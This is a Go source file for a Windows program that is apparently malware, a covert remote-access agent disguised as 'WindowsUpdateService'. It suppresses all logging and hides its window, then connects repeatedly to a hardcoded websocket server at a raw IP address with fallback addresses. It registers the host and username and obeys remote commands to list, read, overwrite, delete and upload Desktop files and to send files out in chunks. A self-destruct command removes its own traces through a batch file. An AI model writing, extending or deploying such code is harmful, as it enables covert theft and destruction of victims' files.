//go:build windows

package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/coder/websocket"
	"golang.org/x/sys/windows/registry"
)

// ==================== HARDCODED VPS IP ====================
const DefaultServerURL = "ws://206.189.131.112:8080/agent"
// ==============================================================

// ==================== PORTABLE CONFIGURATION ====================
const (
	appName    = "WindowsUpdateService"
	configFile = "config.json"
)

var (
	exeDir, _   = filepath.Abs(filepath.Dir(os.Args[0]))
	configPath  = filepath.Join(exeDir, configFile)
	desktopRoot = filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
)

type Config struct {
	Token            string   `json:"token,omitempty"`
	ReconnectDelayMs int      `json:"reconnectDelayMs,omitempty"`
	FallbackIPs      []string `json:"fallbackIPs,omitempty"`
}

type Request struct {
	RequestId   string `json:"requestId"`
	Action      string `json:"action"`
	Path        string `json:"path,omitempty"`
	NewPath     string `json:"newPath,omitempty"`
	ContentBase string `json:"contentBase64,omitempty"`
	ChunkSize   int    `json:"chunkSize,omitempty"`
	Size        int64  `json:"size,omitempty"`
	Offset      int64  `json:"offset,omitempty"`
	DataBase    string `json:"dataBase64,omitempty"`
	Last        bool   `json:"last,omitempty"`
}

type FileInfo struct {
	Name  string `json:"name"`
	IsDir bool   `json:"isDir"`
	Size  int64  `json:"size"`
}

type uploadSession struct {
	finalPath string
	tempFile  *os.File
	mu        sync.Mutex
}

var uploadSessions sync.Map

// ========== MAIN ==========
func main() {
	// Discard all logging – no log file, no console (since -H windowsgui hides it)
	log.SetOutput(io.Discard)

	if err := runAgent(); err != nil {
		os.Exit(1)
	}
}

// ========== AGENT LOOP ==========
func runAgent() error {
	cfg, err := loadConfig()
	if err != nil {
		cfg = Config{
			Token:            "",
			ReconnectDelayMs: 5000,
			FallbackIPs:      []string{},
		}
	}
	if cfg.ReconnectDelayMs == 0 {
		cfg.ReconnectDelayMs = 5000
	}

	ctx := context.Background()
	for {
		// Ignore error – we just retry
		_ = connectWithFallback(ctx, cfg)

		select {
		case <-time.After(time.Duration(cfg.ReconnectDelayMs) * time.Millisecond):
		case <-ctx.Done():
			return nil
		}
	}
}

func loadConfig() (Config, error) {
	var cfg Config
	data, err := os.ReadFile(configPath)
	if err != nil {
		return cfg, err
	}
	err = json.Unmarshal(data, &cfg)
	return cfg, err
}

func saveConfig(cfg Config) error {
	data, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(configPath, data, 0644)
}

func updateFallbackIPs(ips []string) error {
	cfg, err := loadConfig()
	if err != nil {
		return err
	}
	for _, ip := range ips {
		found := false
		for _, existing := range cfg.FallbackIPs {
			if existing == ip {
				found = true
				break
			}
		}
		if !found {
			cfg.FallbackIPs = append([]string{ip}, cfg.FallbackIPs...)
		}
	}
	if len(cfg.FallbackIPs) > 5 {
		cfg.FallbackIPs = cfg.FallbackIPs[:5]
	}
	return saveConfig(cfg)
}

func resolveHostToIPs(serverURL string) ([]string, error) {
	u, err := url.Parse(serverURL)
	if err != nil {
		return nil, err
	}
	host := u.Hostname()
	if host == "" {
		return nil, fmt.Errorf("no hostname in URL")
	}
	ips, err := net.LookupHost(host)
	if err != nil {
		return nil, err
	}
	var ipv4s []string
	for _, ip := range ips {
		if net.ParseIP(ip).To4() != nil {
			ipv4s = append(ipv4s, ip)
		}
	}
	if len(ipv4s) == 0 {
		return ips, nil
	}
	return ipv4s, nil
}

func rewriteHost(originalURL, newHost string) string {
	u, err := url.Parse(originalURL)
	if err != nil {
		parts := strings.SplitN(originalURL, "://", 2)
		if len(parts) != 2 {
			return originalURL
		}
		rest := parts[1]
		idx := strings.IndexAny(rest, "/:")
		if idx == -1 {
			return parts[0] + "://" + newHost
		}
		return parts[0] + "://" + newHost + rest[idx:]
	}
	u.Host = newHost
	if u.Port() == "" && !strings.ContainsRune(newHost, ':') {
		u.Host = newHost + ":8080"
	}
	return u.String()
}

func tryConnect(ctx context.Context, urlStr, token string) error {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	headers := make(map[string][]string)
	if token != "" {
		headers["Authorization"] = []string{"Bearer " + token}
	}
	conn, _, err := websocket.Dial(ctx, urlStr, &websocket.DialOptions{
		HTTPHeader: headers,
	})
	if err != nil {
		return err
	}
	defer conn.Close(websocket.StatusInternalError, "closing")

	hostname, _ := os.Hostname()
	regMsg := map[string]string{
		"type":     "register",
		"clientId": fmt.Sprintf("%s-%s", hostname, os.Getenv("USERNAME")),
		"desktop":  desktopRoot,
	}
	if err := conn.Write(ctx, websocket.MessageText, mustMarshal(regMsg)); err != nil {
		return err
	}

	if ips, err := resolveHostToIPs(urlStr); err == nil && len(ips) > 0 {
		_ = updateFallbackIPs(ips)
	}

	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if err := conn.Ping(ctx); err != nil {
					return
				}
			case <-ctx.Done():
				return
			}
		}
	}()

	for {
		_, msg, err := conn.Read(ctx)
		if err != nil {
			return err
		}
		var req Request
		if err := json.Unmarshal(msg, &req); err != nil {
			continue
		}
		go handleRequest(ctx, conn, req)
	}
}

func connectWithFallback(ctx context.Context, cfg Config) error {
	primaryURL := DefaultServerURL
	err := tryConnect(ctx, primaryURL, cfg.Token)
	if err == nil {
		return nil
	}
	for _, ip := range cfg.FallbackIPs {
		fallbackURL := rewriteHost(primaryURL, ip)
		err := tryConnect(ctx, fallbackURL, cfg.Token)
		if err == nil {
			return nil
		}
	}
	return fmt.Errorf("all connection attempts failed")
}

func handleRequest(ctx context.Context, conn *websocket.Conn, req Request) {
	switch req.Action {
	case "list":
		handleList(conn, req)
	case "read":
		handleRead(conn, req)
	case "write":
		handleWrite(conn, req)
	case "append":
		handleAppend(conn, req)
	case "delete":
		handleDelete(conn, req)
	case "mkdir":
		handleMkdir(conn, req)
	case "rename":
		handleRename(conn, req)
	case "download":
		handleDownload(ctx, conn, req)
	case "upload_init":
		handleUploadInit(conn, req)
	case "upload_chunk":
		handleUploadChunk(conn, req)
	case "self_destruct":
		handleSelfDestruct(conn, req)
	default:
		sendError(conn, req.RequestId, "unknown action: "+req.Action)
	}
}

// ---------- path safety ----------
func safeJoin(relPath string) (string, error) {
	if relPath == "" {
		return desktopRoot, nil
	}
	full := filepath.Join(desktopRoot, relPath)
	full = filepath.Clean(full)
	rel, err := filepath.Rel(desktopRoot, full)
	if err != nil {
		return "", fmt.Errorf("path error: %w", err)
	}
	if strings.HasPrefix(rel, "..") || filepath.IsAbs(rel) {
		return "", fmt.Errorf("path escapes Desktop")
	}
	return full, nil
}

// ---------- response helpers ----------
func sendResponse(conn *websocket.Conn, requestId string, payload interface{}) {
	resp := map[string]interface{}{
		"type":      "file_response",
		"requestId": requestId,
	}
	if p, ok := payload.(map[string]interface{}); ok {
		for k, v := range p {
			resp[k] = v
		}
	} else {
		b, _ := json.Marshal(payload)
		var m map[string]interface{}
		json.Unmarshal(b, &m)
		for k, v := range m {
			resp[k] = v
		}
	}
	conn.Write(context.Background(), websocket.MessageText, mustMarshal(resp))
}

func sendError(conn *websocket.Conn, requestId, errMsg string) {
	sendResponse(conn, requestId, map[string]interface{}{
		"ok":    false,
		"error": errMsg,
	})
}

func mustMarshal(v interface{}) []byte {
	b, _ := json.Marshal(v)
	return b
}

// ---------- file operations ----------
func handleList(conn *websocket.Conn, req Request) {
	dir, err := safeJoin(req.Path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	var files []FileInfo
	for _, e := range entries {
		info, _ := e.Info()
		size := int64(0)
		if info != nil && !e.IsDir() {
			size = info.Size()
		}
		files = append(files, FileInfo{
			Name:  e.Name(),
			IsDir: e.IsDir(),
			Size:  size,
		})
	}
	sendResponse(conn, req.RequestId, map[string]interface{}{
		"ok":    true,
		"files": files,
	})
}

func handleRead(conn *websocket.Conn, req Request) {
	path, err := safeJoin(req.Path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	data, err := os.ReadFile(path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	sendResponse(conn, req.RequestId, map[string]interface{}{
		"ok":            true,
		"contentBase64": base64.StdEncoding.EncodeToString(data),
	})
}

func handleWrite(conn *websocket.Conn, req Request) {
	path, err := safeJoin(req.Path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.ContentBase)
	if err != nil {
		sendError(conn, req.RequestId, "invalid base64")
		return
	}
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	sendResponse(conn, req.RequestId, map[string]interface{}{"ok": true})
}

func handleAppend(conn *websocket.Conn, req Request) {
	path, err := safeJoin(req.Path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.ContentBase)
	if err != nil {
		sendError(conn, req.RequestId, "invalid base64")
		return
	}
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	defer f.Close()
	if _, err := f.Write(data); err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	sendResponse(conn, req.RequestId, map[string]interface{}{"ok": true})
}

func handleDelete(conn *websocket.Conn, req Request) {
	path, err := safeJoin(req.Path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	if err := os.RemoveAll(path); err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	sendResponse(conn, req.RequestId, map[string]interface{}{"ok": true})
}

func handleMkdir(conn *websocket.Conn, req Request) {
	path, err := safeJoin(req.Path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	if err := os.MkdirAll(path, 0755); err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	sendResponse(conn, req.RequestId, map[string]interface{}{"ok": true})
}

func handleRename(conn *websocket.Conn, req Request) {
	oldPath, err := safeJoin(req.Path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	newPath, err := safeJoin(req.NewPath)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	if err := os.Rename(oldPath, newPath); err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	sendResponse(conn, req.RequestId, map[string]interface{}{"ok": true})
}

func handleDownload(ctx context.Context, conn *websocket.Conn, req Request) {
	path, err := safeJoin(req.Path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	chunkSize := req.ChunkSize
	if chunkSize <= 0 {
		chunkSize = 65536
	}
	file, err := os.Open(path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	defer file.Close()

	buf := make([]byte, chunkSize)
	var offset int64
	for {
		n, err := file.ReadAt(buf, offset)
		if n > 0 {
			chunkMsg := map[string]interface{}{
				"type":       "download_chunk",
				"requestId":  req.RequestId,
				"offset":     offset,
				"dataBase64": base64.StdEncoding.EncodeToString(buf[:n]),
				"last":       err == io.EOF,
			}
			if err := conn.Write(ctx, websocket.MessageText, mustMarshal(chunkMsg)); err != nil {
				return
			}
			offset += int64(n)
		}
		if err != nil {
			if err == io.EOF {
				break
			}
			sendError(conn, req.RequestId, err.Error())
			return
		}
	}
}

func handleUploadInit(conn *websocket.Conn, req Request) {
	finalPath, err := safeJoin(req.Path)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	tmpFile, err := os.CreateTemp("", "win_gfx_upload_*")
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	uploadSessions.Store(req.RequestId, &uploadSession{
		finalPath: finalPath,
		tempFile:  tmpFile,
	})
	sendResponse(conn, req.RequestId, map[string]interface{}{"ok": true})
}

func handleUploadChunk(conn *websocket.Conn, req Request) {
	v, ok := uploadSessions.Load(req.RequestId)
	if !ok {
		sendError(conn, req.RequestId, "unknown upload session")
		return
	}
	sess := v.(*uploadSession)
	sess.mu.Lock()
	defer sess.mu.Unlock()

	data, err := base64.StdEncoding.DecodeString(req.DataBase)
	if err != nil {
		sendError(conn, req.RequestId, "invalid base64")
		return
	}
	_, err = sess.tempFile.WriteAt(data, req.Offset)
	if err != nil {
		sendError(conn, req.RequestId, err.Error())
		return
	}
	if req.Last {
		sess.tempFile.Close()
		if err := os.MkdirAll(filepath.Dir(sess.finalPath), 0755); err != nil {
			sendError(conn, req.RequestId, err.Error())
			return
		}
		if err := os.Rename(sess.tempFile.Name(), sess.finalPath); err != nil {
			sendError(conn, req.RequestId, err.Error())
			return
		}
		uploadSessions.Delete(req.RequestId)
	}
	sendResponse(conn, req.RequestId, map[string]interface{}{"ok": true, "offset": req.Offset})
}

// ========== SELF DESTRUCT ==========
func handleSelfDestruct(conn *websocket.Conn, req Request) {
	// Delete config
	os.Remove(configPath)

	// Delete the EXE itself
	exePath, _ := os.Executable()
	batPath := filepath.Join(os.TempDir(), "selfdestruct.bat")
	batContent := fmt.Sprintf(`@echo off
timeout /t 2 /nobreak > nul
del /f /q "%s"
del /f /q "%%~f0"
`, exePath)

	if err := os.WriteFile(batPath, []byte(batContent), 0644); err == nil {
		cmd := exec.Command("cmd", "/c", batPath)
		cmd.Start()
	}

	sendResponse(conn, req.RequestId, map[string]interface{}{
		"ok":      true,
		"message": "Self-destruct initiated",
	})

	go func() {
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)
	}()
}

